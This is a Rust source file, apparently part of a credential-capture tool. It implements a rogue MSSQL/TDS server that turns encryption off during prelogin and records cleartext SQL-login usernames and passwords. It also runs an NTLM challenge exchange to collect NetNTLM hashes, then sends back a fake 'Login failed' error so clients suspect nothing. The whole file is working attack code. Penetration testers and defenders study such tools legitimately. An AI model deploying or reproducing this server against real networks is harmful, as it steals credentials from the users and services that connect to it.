//! Rogue MSSQL/TDS server (TCP 1433) capturing SQL-auth cleartext credentials and NTLM SSPI
//! tokens.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::protocols::ntlm;
use crate::protocols::tds::{self, TdsHeader};

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

fn build_prelogin_response() -> Vec<u8> {
    // Option tokens are (token, offset, len) followed by data and a 0xFF terminator.
    // Offsets are relative to the start of the packet payload.
    let options: Vec<(u8, Vec<u8>)> = vec![
        (0x00, vec![0x0f, 0x00, 0x07, 0xd0, 0x00, 0x00]), // VERSION
        (0x01, vec![0x00]),                               // ENCRYPTION off
        (0x02, vec![0x00]),                               // INSTOPT
        (0x03, vec![0x00, 0x00, 0x00, 0x00]),             // THREADID
        (0x04, vec![0x00]),                               // MARS
    ];

    let header_len = options.len() * 5 + 1;
    let mut header = Vec::new();
    let mut data = Vec::new();
    for (token, value) in &options {
        let offset = header_len + data.len();
        header.push(*token);
        header.extend_from_slice(&(offset as u16).to_be_bytes());
        header.extend_from_slice(&(value.len() as u16).to_be_bytes());
        data.extend_from_slice(value);
    }
    header.push(0xff);
    header.extend_from_slice(&data);
    header
}

fn build_login_error() -> Vec<u8> {
    let mut payload = Vec::new();
    // ERROR token (0xAA)
    let message = "Login failed for user".encode_utf16().collect::<Vec<u16>>();
    let msg_utf16: Vec<u8> = message.iter().flat_map(|u| u.to_le_bytes()).collect();
    let server = "SQL".encode_utf16().collect::<Vec<u16>>();
    let server_utf16: Vec<u8> = server.iter().flat_map(|u| u.to_le_bytes()).collect();
    let proc: Vec<u8> = Vec::new();

    // token, length, number, state, class, msg_len, msg, srv_name_len, srv_name, proc_len,
    // proc, line
    let mut body = Vec::new();
    body.extend_from_slice(&18456u32.to_le_bytes()); // number
    body.push(1); // state
    body.push(14); // class
    body.extend_from_slice(&(message.len() as u16).to_le_bytes());
    body.extend_from_slice(&msg_utf16);
    body.push(server.len() as u8);
    body.extend_from_slice(&server_utf16);
    body.push(proc.len() as u8);
    body.extend_from_slice(&proc);
    body.extend_from_slice(&0u32.to_le_bytes()); // line

    payload.push(0xaa);
    payload.extend_from_slice(&(body.len() as u16).to_le_bytes());
    payload.extend_from_slice(&body);
    // DONE token (0xFD): status, curcmd, rowcount
    payload.push(0xfd);
    payload.extend_from_slice(&0x0002u16.to_le_bytes()); // DONE_ERROR
    payload.extend_from_slice(&0u16.to_le_bytes());
    payload.extend_from_slice(&0u64.to_le_bytes());
    tds::frame(tds::PKT_RESPONSE, &payload)
}

async fn handle(mut stream: TcpStream, peer: SocketAddr, ctx: Arc<ServerContext>) -> Result<()> {
    // Pre-read 8-byte TDS header, then the body.
    loop {
        let mut hdr = [0u8; 8];
        if stream.read_exact(&mut hdr).await.is_err() {
            break;
        }
        let Some(header) = TdsHeader::parse(&hdr) else {
            break;
        };
        let body_len = header.length.saturating_sub(8) as usize;
        let mut body = vec![0u8; body_len];
        if stream.read_exact(&mut body).await.is_err() {
            break;
        }
        match header.packet_type {
            tds::PKT_PRELOGIN => {
                let resp = tds::frame(tds::PKT_RESPONSE, &build_prelogin_response());
                stream.write_all(&resp).await?;
            }
            tds::PKT_LOGIN7 => {
                let login = tds::parse_login7(&body);
                if let (Some(user), Some(pass)) = (&login.username, &login.password)
                    && let Some(art) =
                        CaptureArtifact::cleartext(Protocol::Mssql, peer.ip(), user, pass)
                {
                    ctx.sink.artifact(art);
                }
                if let Some(token) = login.ntlmssp.as_deref().and_then(ntlm_sspi) {
                    respond_ntlm(&mut stream, &token, peer, &ctx, &mut Vec::new()).await?;
                }
                let resp = build_login_error();
                stream.write_all(&resp).await?;
            }
            tds::PKT_SSPI => {
                if let Some(token) = ntlm_sspi(&body) {
                    respond_ntlm(&mut stream, &token, peer, &ctx, &mut Vec::new()).await?;
                }
            }
            _ => {
                let resp = build_login_error();
                stream.write_all(&resp).await?;
            }
        }
    }
    Ok(())
}

fn ntlm_sspi(body: &[u8]) -> Option<Vec<u8>> {
    crate::protocols::smb::extract_ntlmssp(body)
}

async fn respond_ntlm(
    stream: &mut TcpStream,
    token: &[u8],
    peer: SocketAddr,
    ctx: &ServerContext,
    _buf: &mut Vec<u8>,
) -> Result<()> {
    let ch = ctx.challenge_for(crate::constants::Service::Mssql);
    match ntlm::message_type(token) {
        Some(1) => {
            let challenge = ctx.build_challenge(crate::constants::Service::Mssql);
            let resp = tds::frame(tds::PKT_SSPI, &challenge);
            stream.write_all(&resp).await?;
        }
        Some(3) => {
            if let Some(net) = ntlm::parse_type3(token, &ch) {
                ctx.sink
                    .artifact(CaptureArtifact::netntlm(Protocol::Mssql, peer.ip(), &net));
            }
        }
        _ => {}
    }
    Ok(())
}

#[allow(dead_code)]
fn _b64() -> String {
    B64.encode([0u8])
}
